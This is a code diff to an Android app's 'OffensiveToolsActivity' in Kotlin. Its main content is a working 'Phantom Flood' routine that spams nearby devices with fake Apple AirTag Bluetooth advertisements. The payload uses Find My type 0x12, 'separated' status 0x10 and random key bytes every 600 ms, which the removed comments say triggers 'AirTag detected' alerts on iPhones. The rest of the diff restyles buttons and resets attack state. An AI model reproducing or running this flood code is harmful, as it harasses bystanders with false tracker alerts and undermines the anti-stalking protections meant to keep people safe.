     // ─── PHANTOM FLOOD (AirTag Spam) ───
-    // Floods area with fake Apple AirTag (Find My) BLE advertisements
-    // Inspired by HaleHound CYD firmware's Phantom Flood attack
-    // Apple Find My uses manufacturer data 0x004C with type 0x12 (FindMy)
     private fun startPhantomFlood() {
         val runnable = object : Runnable {
             override fun run() {
@@ -696,18 +742,12 @@ class OffensiveToolsActivity : Activity() {
 
                 val rand = java.util.Random()
 
-                // Apple Find My advertisement (AirTag format)
-                // Type 0x12 = Find My, Length varies
-                // Contains: status, public key fragment, hint byte
                 val payload = ByteArray(29)
-                payload[0] = 0x12           // Continuity type: Find My
-                payload[1] = 0x19           // Payload size: 25
-                payload[2] = 0x10           // Status: separated (triggers "AirTag detected" alerts)
-                // 22 bytes of random public key data (makes each ad look like a unique AirTag)
+                payload[0] = 0x12
+                payload[1] = 0x19
+                payload[2] = 0x10
                 for (i in 3 until 25) payload[i] = rand.nextInt(256).toByte()
-                // Hint byte
                 payload[25] = rand.nextInt(4).toByte()
-                // Additional random bytes
                 payload[26] = rand.nextInt(256).toByte()
                 payload[27] = rand.nextInt(256).toByte()
                 payload[28] = rand.nextInt(256).toByte()
@@ -715,7 +755,7 @@ class OffensiveToolsActivity : Activity() {
                 val data = BleAdvertiseHelper.buildManufacturerData(0x004C, payload)
                 safeAdvertise(data)
 
-                handler.postDelayed(this, 600) // Slightly slower to let iOS process each "unique" tag
+                handler.postDelayed(this, 600)
             }
         }
         handler.post(runnable)
@@ -723,13 +763,17 @@ class OffensiveToolsActivity : Activity() {
 
     private fun stopAttack() {
         isAttacking = false
+        activeAttackName = null
         handler.removeCallbacksAndMessages(null)
         try {
             currentCallback?.let { advertiser?.stopAdvertising(it) }
         } catch (_: SecurityException) {}
         currentCallback = null
-        statusText?.text = "STOPPED"
+        statusText?.text = "IDLE"
         statusText?.setTextColor(0xFF44FF44.toInt())
+        packetCount = 0
+        packetsText?.text = "Packets: 0"
+        requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_UNSPECIFIED
     }
 
     override fun onDestroy() {
@@ -744,56 +788,74 @@ class OffensiveToolsActivity : Activity() {
         }
     }
 
-    private fun buildAttackButton(label: String, desc: String): LinearLayout {
+    // ─── UI BUILDERS ───
+
+    private fun buildSectionLabel(label: String, tc: Int): TextView {
+        return TextView(this).apply {
+            text = label
+            textSize = 9f
+            letterSpacing = 0.3f
+            typeface = Typeface.create(Typeface.MONOSPACE, Typeface.BOLD)
+            setTextColor(adjustAlpha(tc, 0.5f))
+            setPadding(dp(4), dp(14), 0, dp(4))
+        }
+    }
+
+    private fun buildAttackButton(label: String, desc: String, tc: Int): LinearLayout {
         val container = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
             background = GradientDrawable(
                 GradientDrawable.Orientation.TOP_BOTTOM,
-                intArrayOf(0xFF4A0000.toInt(), 0xFF1A0000.toInt())
+                intArrayOf(0xFF181818.toInt(), 0xFF101010.toInt())
             ).apply {
-                cornerRadius = dp(18).toFloat()
-                setStroke(dp(1), themeColor(this@OffensiveToolsActivity))
+                cornerRadius = dp(12).toFloat()
+                setStroke(dp(1), adjustAlpha(tc, 0.15f))
             }
-            setPadding(dp(16), dp(14), dp(16), dp(14))
+            setPadding(dp(14), dp(12), dp(14), dp(12))
             val lp = LinearLayout.LayoutParams(
                 LinearLayout.LayoutParams.MATCH_PARENT,
                 LinearLayout.LayoutParams.WRAP_CONTENT
             )
-            lp.setMargins(0, 0, 0, dp(8))
+            lp.setMargins(0, 0, 0, dp(6))
             layoutParams = lp
             isClickable = true
             isFocusable = true
         }
         container.addView(TextView(this).apply {
             text = label
-            textSize = 14f
+            textSize = 13f
             typeface = Typeface.create(Typeface.MONOSPACE, Typeface.BOLD)
-            setTextColor(0xFFFFF1E0.toInt())
+            setTextColor(0xFFF0E6D6.toInt())
         })
         container.addView(TextView(this).apply {
             text = desc
-            textSize = 10f
+            textSize = 9f
             typeface = Typeface.MONOSPACE
-            setTextColor(0xFF888888.toInt())
+            setTextColor(0xFF666666.toInt())
             setPadding(0, dp(2), 0, 0)
         })
         return container
     }
 
-    private fun buildHellButton(label: String) = Button(this).apply {
+    private fun buildThemedButton(label: String, tc: Int) = Button(this).apply {
         text = label
         isAllCaps = true
-        textSize = 13f
+        textSize = 12f
         typeface = Typeface.create(Typeface.MONOSPACE, Typeface.BOLD)
-        setTextColor(0xFFFFF1E0.toInt())
+        setTextColor(0xFFF0E6D6.toInt())
         background = GradientDrawable(
             GradientDrawable.Orientation.TOP_BOTTOM,
-            intArrayOf(0xFF6A0000.toInt(), 0xFF260000.toInt())
+            intArrayOf(0xFF1A1A1A.toInt(), 0xFF111111.toInt())
         ).apply {
-            cornerRadius = dp(18).toFloat()
-            setStroke(dp(1), themeColor(this@OffensiveToolsActivity))
+            cornerRadius = dp(14).toFloat()
+            setStroke(dp(1), adjustAlpha(tc, 0.2f))
         }
-        setPadding(dp(10), dp(14), dp(10), dp(14))
+        setPadding(dp(10), dp(12), dp(10), dp(12))
+    }
+
+    private fun adjustAlpha(color: Int, factor: Float): Int {
+        val alpha = (255 * factor).toInt()
+        return (alpha shl 24) or (color and 0x00FFFFFF)
     }
 
     private fun dp(value: Int): Int = (value * resources.displayMetrics.density).toInt()
